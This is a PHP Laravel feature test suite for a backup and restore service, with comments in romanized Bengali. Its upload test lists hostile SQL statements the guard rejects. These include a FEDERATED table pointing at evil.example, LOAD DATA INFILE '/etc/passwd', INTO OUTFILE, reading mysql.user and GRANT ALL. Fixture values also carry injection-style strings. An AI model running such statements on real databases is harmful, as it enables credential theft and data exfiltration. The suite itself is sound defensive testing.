<?php

namespace Tests\Feature\Audit;

use App\Models\Backup;
use App\Models\BackupSchedule;
use App\Services\Backup\BackupCrypto;
use App\Services\Backup\SqlGuard;
use App\Services\Backup\SqlReader;
use App\Services\BackupService;
use App\Services\Monitoring\MonitoringService;
use Illuminate\Database\Connection;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Str;
use Tests\Feature\Security\SecurityTestCase;

/**
 * Backup/restore asol engine diye, ekta alada (scratch) database e: backup -> check (alada database e test restore)
 * -> data bodle -> restore -> hubohu ager moto. Upload e bipodjonok statement bondho, automatic niyom, access.
 */
class BackupTest extends SecurityTestCase
{
    private string $dir;
    private string $scratch;

    protected function setUp(): void
    {
        parent::setUp();
        $this->dir = storage_path('framework/testing/backups-' . Str::random(8));
        $this->scratch = config('database.connections.mysql.database') . '_bk_live';
        config(['backup.path' => $this->dir, 'backup.encryption_key' => null, 'backup.connection' => 'bk_live', 'backup.migrate_after_restore' => false,
            'database.connections.bk_admin' => config('database.connections.mysql'),
            'database.connections.bk_live' => ['database' => $this->scratch] + config('database.connections.mysql')]);
    }

    protected function tearDown(): void
    {
        DB::connection('bk_admin')->statement("DROP DATABASE IF EXISTS `{$this->scratch}`");
        DB::connection('bk_admin')->statement("DROP DATABASE IF EXISTS `{$this->scratch}_restore_check`");
        DB::purge('bk_live');
        DB::purge('bk_admin');
        File::deleteDirectory($this->dir);
        parent::tearDown();
    }

    // "dokan" er chhoto database: kothin man (quote, ;, backslash, Bangla, NULL, binary), generated column, foreign key
    private function shop(): Connection
    {
        DB::connection('bk_admin')->statement("DROP DATABASE IF EXISTS `{$this->scratch}`");
        DB::connection('bk_admin')->statement("CREATE DATABASE `{$this->scratch}` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
        DB::purge('bk_live');
        $db = DB::connection('bk_live');
        $db->unprepared("CREATE TABLE migrations (id int unsigned AUTO_INCREMENT PRIMARY KEY, migration varchar(191) NOT NULL, batch int NOT NULL)");
        $db->unprepared("CREATE TABLE users (id bigint unsigned AUTO_INCREMENT PRIMARY KEY, name varchar(100) NOT NULL, email varchar(100) NOT NULL)");
        $db->unprepared("CREATE TABLE items (id bigint unsigned AUTO_INCREMENT PRIMARY KEY, user_id bigint unsigned NULL, name varchar(190) NOT NULL,
            code varchar(20) NOT NULL, code_upper varchar(20) GENERATED ALWAYS AS (UPPER(code)) STORED, price decimal(15,2) NOT NULL,
            note text NULL, data varbinary(16) NULL, CONSTRAINT items_user FOREIGN KEY (user_id) REFERENCES users (id)) ENGINE=InnoDB");
        $db->unprepared("CREATE TABLE sessions (id varchar(100) PRIMARY KEY, payload text NOT NULL)");
        $db->table('migrations')->insert(['migration' => '0001_create_users', 'batch' => 1]);
        $db->table('users')->insert(['id' => 1, 'name' => 'Owner', 'email' => 'owner@example.com']);
        $db->table('items')->insert([
            ['user_id' => 1, 'name' => "Rahim's \"phone\"; DROP DATABASE x; -- \\ back", 'code' => 'ab1', 'price' => '1250.50', 'note' => 'মোবাইল ফোন', 'data' => "\x00\xFF\x10"],
            ['user_id' => null, 'name' => 'Charger', 'code' => 'ch', 'price' => '300.00', 'note' => null, 'data' => null],
            ['user_id' => 1, 'name' => "line1\nline2\ttab", 'code' => 'x', 'price' => '0.00', 'note' => '', 'data' => ''],
        ]);
        $db->table('sessions')->insert(['id' => 'live-session', 'payload' => 'x']);

        return $db;
    }

    private function items(Connection $db): array
    {
        return $db->table('items')->orderBy('id')->get()->map(fn ($r) => (array) $r)->all();
    }

    public function test_backup_now_check_and_restore_bring_back_exactly_the_same_data(): void
    {
        $db = $this->shop();
        $before = $this->items($db);
        $admin = $this->admin();

        $this->actingAs($admin)->post(route('backups.store'), ['note' => 'Before Eid price update'])->assertSessionMissing('error');
        $backup = Backup::sole();
        $this->assertSame([Backup::COMPLETED, 'manual', 'Before Eid price update', $admin->id], [$backup->status, $backup->trigger, $backup->note, $backup->created_by]);
        $this->assertSame(['items' => 3, 'migrations' => 1, 'users' => 1], $backup->row_counts);   // sessions bad
        $this->assertFileExists($backup->path() . '.json');
        $this->assertSame($backup->sha256, hash_file('sha256', $backup->path()));

        // Check: alada database e restore kore mile, tarpor sei database nei
        $this->actingAs($admin)->post(route('backups.verify', $backup->id))->assertSessionMissing('error');
        $this->assertSame('passed', $backup->fresh()->verify_status, (string) $backup->fresh()->verify_note);
        $this->assertSame(0, (int) DB::connection('bk_admin')->selectOne('SELECT COUNT(*) AS n FROM information_schema.SCHEMATA WHERE SCHEMA_NAME = ?', ["{$this->scratch}_restore_check"])->n);

        // backup er por bodlano
        $db->table('items')->where('id', 1)->update(['price' => '1.00', 'name' => 'changed']);
        $db->table('items')->where('id', 2)->delete();
        $db->table('users')->update(['name' => 'Hacker']);
        $db->unprepared('CREATE TABLE later_table (id int)');
        $db->table('sessions')->insert(['id' => 'new-session', 'payload' => 'y']);

        // restore: password abar, tarpor RESTORE lekha
        $this->actingAs($admin)->get(route('backups.restore.confirm', $backup->id))->assertRedirect(route('password.confirm'));
        $session = ['auth.password_confirmed_at' => time()];
        $this->actingAs($admin)->withSession($session)->get(route('backups.restore.confirm', $backup->id))->assertOk()->assertSee('RESTORE');
        $this->actingAs($admin)->withSession($session)->post(route('backups.restore', $backup->id), ['confirm' => 'yes'])->assertSessionHasErrors('confirm');
        $this->assertSame('Hacker', $db->table('users')->value('name'));

        $this->actingAs($admin)->withSession($session)->post(route('backups.restore', $backup->id), ['confirm' => 'RESTORE'])
            ->assertRedirect(route('backups.index'))->assertSessionMissing('error');
        $this->assertSame($before, $this->items($db));
        $this->assertSame("\x00\xFF\x10", $db->table('items')->where('id', 1)->value('data'));
        $this->assertSame('AB1', $db->table('items')->where('id', 1)->value('code_upper'));
        $this->assertSame('Owner', $db->table('users')->value('name'));
        $this->assertFalse($db->getSchemaBuilder()->hasTable('later_table'));
        $this->assertSame(2, $db->table('sessions')->count());   // login session chhoya hoy na

        $safety = Backup::where('trigger', 'before_restore')->sole();
        $this->assertSame(Backup::COMPLETED, $safety->status);
        $this->assertSame(['items' => 2, 'later_table' => 0, 'migrations' => 1, 'users' => 1], $safety->row_counts);
        $this->assertNotNull($backup->fresh()->restored_at);
        $this->assertDatabaseHas('audit_logs', ['action' => 'backup.restored', 'auditable_id' => $backup->id]);

        // "before restore" theke abar ferot
        app(BackupService::class)->restore($safety);
        $this->assertSame('changed', $db->table('items')->where('id', 1)->value('name'));
        $this->assertTrue($db->getSchemaBuilder()->hasTable('later_table'));
    }

    public function test_upload_accepts_real_exports_and_refuses_anything_but_tables_and_rows(): void
    {
        $this->shop();
        $admin = $this->admin();

        // phpMyAdmin er moto export (; ar "DROP DATABASE" lekha man er bhitore - eta data, statement na)
        $export = <<<'SQL'
-- phpMyAdmin SQL Dump
SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";
/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET NAMES utf8mb4 */;

CREATE TABLE `migrations` (`id` int(10) UNSIGNED NOT NULL, `migration` varchar(191) NOT NULL, `batch` int(11) NOT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
INSERT INTO `migrations` (`id`, `migration`, `batch`) VALUES (1, '0001_create_users', 1);
CREATE TABLE `users` (`id` bigint(20) UNSIGNED NOT NULL, `name` varchar(100) NOT NULL, `email` varchar(100) NOT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
INSERT INTO `users` (`id`, `name`, `email`) VALUES
(1, 'Owner; DROP DATABASE shop; --', 'o@x.com'),
(2, 'Karim \'K\'', 'k@x.com');
/* block comment; with semicolon */
ALTER TABLE `users` ADD PRIMARY KEY (`id`);
ALTER TABLE `users` MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
COMMIT;
SQL;
        $this->actingAs($admin)->post(route('backups.upload'), ['file' => UploadedFile::fake()->createWithContent('shop.sql', $export), 'note' => 'From old PC'])
            ->assertSessionMissing('error');
        $uploaded = Backup::sole();
        $this->assertSame(['uploaded', 'shop.sql', 'From old PC', 2], [$uploaded->trigger, $uploaded->original_name, $uploaded->note, $uploaded->table_count]);
        $this->assertSame('passed', app(BackupService::class)->verify($uploaded)['status']);
        $this->assertSame(['migrations' => 1, 'users' => 2], $uploaded->fresh()->row_counts);

        $bad = [
            "CREATE TRIGGER t BEFORE INSERT ON users FOR EACH ROW SET NEW.name = 'x'",
            'DROP DATABASE mobile_software',
            'INSERT INTO users (id, name, email) SELECT id, user, host FROM mysql.user',
            "GRANT ALL ON *.* TO 'x'@'%'",
            "UPDATE users SET email = 'x'",
            'DELETE FROM users',
            "CREATE TABLE spy (id int) ENGINE=FEDERATED CONNECTION='mysql://u:p@evil.example/db/t'",
            'SET GLOBAL general_log = 1',
            "SELECT * FROM users INTO OUTFILE '/tmp/x'",
            'INSERT INTO other_db.users VALUES (1)',
            'ALTER TABLE users RENAME TO old_users',
            "CREATE VIEW v AS SELECT 1",
            "LOAD DATA INFILE '/etc/passwd' INTO TABLE users",
        ];
        foreach ($bad as $i => $statement) {
            $file = UploadedFile::fake()->createWithContent("bad{$i}.sql", "CREATE TABLE `users` (id int);\nCREATE TABLE `migrations` (id int);\n{$statement};\n");
            $this->actingAs($admin)->post(route('backups.upload'), ['file' => $file])
                ->assertSessionHas('error', fn ($e) => str_contains($e, 'not allowed'));
        }
        $this->actingAs($admin)->post(route('backups.upload'), ['file' => UploadedFile::fake()->createWithContent('other.sql', 'CREATE TABLE posts (id int);')])
            ->assertSessionHas('error', fn ($e) => str_contains($e, 'does not look like'));
        $this->actingAs($admin)->post(route('backups.upload'), ['file' => UploadedFile::fake()->createWithContent('x.txt', 'hello')])
            ->assertSessionHas('error');
        $this->assertSame(1, Backup::count());
        $this->assertSame(count($bad) + 2, \App\Models\AuditLog::where('action', 'backup.upload_refused')->count());

        // adhura export (database er ardhek table er kom) restore hoy na
        $db = DB::connection('bk_live');
        foreach (['a1', 'a2', 'a3', 'a4'] as $t) {
            $db->unprepared("CREATE TABLE {$t} (id int)");
        }
        $this->assertThrows(fn () => app(BackupService::class)->restore($uploaded), \RuntimeException::class, 'partial export');
        $this->assertSame('Owner', $db->table('users')->value('name'));
        $this->assertSame(0, Backup::where('trigger', 'before_restore')->count());
    }

    public function test_statement_reader_and_guard_handle_quotes_comments_and_executable_comments(): void
    {
        $file = $this->dir . '/r.sql';
        File::ensureDirectoryExists($this->dir);
        file_put_contents($file, "-- comment ; here\n# another;\n/*!40101 SET NAMES utf8mb4 */;\nINSERT INTO `t` VALUES ('a;b', \"c\\\"d;\", 'e''f;');\n/* x; */ SET FOREIGN_KEY_CHECKS=0");
        $statements = iterator_to_array(SqlReader::statements($file), false);
        $this->assertCount(3, $statements);
        $this->assertSame("INSERT INTO `t` VALUES ('a;b', \"c\\\"d;\", 'e''f;')", $statements[1]);
        $this->assertSame(['set', 'insert', 'set'], array_map(fn ($s) => SqlGuard::inspect($s)['kind'], $statements));

        file_put_contents($file, "INSERT INTO t VALUES ('not closed");
        $this->assertThrows(fn () => iterator_to_array(SqlReader::statements($file)), \RuntimeException::class, 'cut off');
    }

    public function test_encrypted_backup_wrong_key_tampering_download_and_delete(): void
    {
        $this->shop();
        config(['backup.encryption_key' => BackupCrypto::generateKey()]);
        $service = app(BackupService::class);
        $backup = $service->run();
        $this->assertTrue($backup->encrypted);
        $this->assertStringNotContainsString('CREATE TABLE', file_get_contents($backup->path()));
        $this->assertSame('passed', $service->verify($backup)['status']);

        $real = config('backup.encryption_key');
        config(['backup.encryption_key' => BackupCrypto::generateKey()]);
        $this->assertSame('failed', $service->verify($backup)['status']);
        $this->assertStringContainsString('cannot be decrypted', $backup->fresh()->verify_note);
        config(['backup.encryption_key' => $real]);

        $admin = $this->admin();
        $this->actingAs($admin)->get(route('backups.download', $backup->id))->assertRedirect(route('password.confirm'));
        $this->actingAs($admin)->withSession(['auth.password_confirmed_at' => time()])->get(route('backups.download', $backup->id))
            ->assertOk()->assertDownload($backup->filename);
        $this->assertDatabaseHas('audit_logs', ['action' => 'backup.downloaded', 'auditable_id' => $backup->id]);

        file_put_contents($backup->path(), 'x', FILE_APPEND);
        $this->assertSame('failed', $service->verify($backup)['status']);
        $this->assertThrows(fn () => $service->restore($backup), \RuntimeException::class, 'Checksum mismatch');

        $this->actingAs($admin)->post(route('backups.destroy', $backup->id))->assertSessionMissing('error');
        $this->assertFileDoesNotExist($backup->path());
        $this->assertSame(0, Backup::count());
        $this->assertDatabaseHas('audit_logs', ['action' => 'backup.deleted']);
    }

    public function test_automatic_backups_run_once_per_slot_and_keep_only_the_last_n(): void
    {
        $this->shop();
        $admin = $this->admin();
        Carbon::setTestNow(Carbon::parse('2026-11-01 01:00'));   // niyom chalu - ager shomoyer backup ekhon na
        $this->actingAs($admin)->post(route('backups.schedule'), ['enabled' => 1, 'frequency' => 'daily', 'time' => '02:30', 'keep' => 2])->assertSessionMissing('error');
        $this->actingAs($admin)->post(route('backups.store'))->assertSessionMissing('error');   // hate newa - muchbe na
        $service = app(BackupService::class);

        Carbon::setTestNow(Carbon::parse('2026-11-01 02:29'));
        $this->assertNull($service->runScheduled());
        Carbon::setTestNow(Carbon::parse('2026-11-01 02:31'));
        $this->assertSame('automatic', $service->runScheduled()?->trigger);
        Carbon::setTestNow(Carbon::parse('2026-11-01 14:00'));
        $this->assertNull($service->runScheduled());
        foreach (['2026-11-02 09:00', '2026-11-03 02:30', '2026-11-04 03:00'] as $time) {
            Carbon::setTestNow(Carbon::parse($time));
            $this->assertNotNull($service->runScheduled());
        }
        $this->assertSame(2, Backup::where('trigger', 'automatic')->count());
        $this->assertSame(['2026-11-03', '2026-11-04'], Backup::where('trigger', 'automatic')->orderBy('id')->get()->map(fn ($b) => $b->completed_at->toDateString())->all());
        $this->assertSame(1, Backup::where('trigger', 'manual')->count());
        $this->assertNotSame('critical', app(MonitoringService::class)->checks()['backup']['status']);

        $weekly = new BackupSchedule(['frequency' => 'weekly', 'time' => '22:00', 'weekday' => 5]);   // shukrobar
        $this->assertSame('2026-10-30 22:00', $weekly->lastSlot(Carbon::parse('2026-11-04 10:00'))->format('Y-m-d H:i'));
        $six = new BackupSchedule(['frequency' => 'every_6_hours', 'time' => '02:30']);
        $this->assertSame('2026-11-04 08:30', $six->lastSlot(Carbon::parse('2026-11-04 10:00'))->format('Y-m-d H:i'));
        $this->assertSame('2026-11-03 20:30', $six->lastSlot(Carbon::parse('2026-11-04 01:00'))->format('Y-m-d H:i'));
        Carbon::setTestNow();

        $this->actingAs($admin)->post(route('backups.schedule'), ['frequency' => 'daily', 'time' => '02:30', 'keep' => 2]);
        $this->assertFalse(BackupSchedule::current()->enabled);
        $this->assertNull($service->runScheduled());
        $this->assertSame('warning', app(MonitoringService::class)->checks()['backup']['status']);
    }

    public function test_backup_page_is_admin_only_and_shows_the_panels(): void
    {
        $this->shop();
        $manager = $this->staff('manager');
        $this->actingAs($manager)->get(route('backups.index'))->assertForbidden();
        $this->actingAs($manager)->post(route('backups.store'))->assertForbidden();
        $this->actingAs($manager)->post(route('backups.upload'))->assertForbidden();

        $this->actingAs($this->admin())->get(route('backups.index'))->assertOk()
            ->assertSee('Back up now')->assertSee('Automatic backups')->assertSee('Upload a backup')->assertSee($this->scratch)->assertSee('Never');
        app(BackupService::class)->directory();   // prothom backup e folder toiri: web theke bondho
        $this->assertFileExists($this->dir . DIRECTORY_SEPARATOR . '.htaccess');
        $this->assertContains('.env', array_map('trim', file(base_path('.gitignore'))));
    }
}
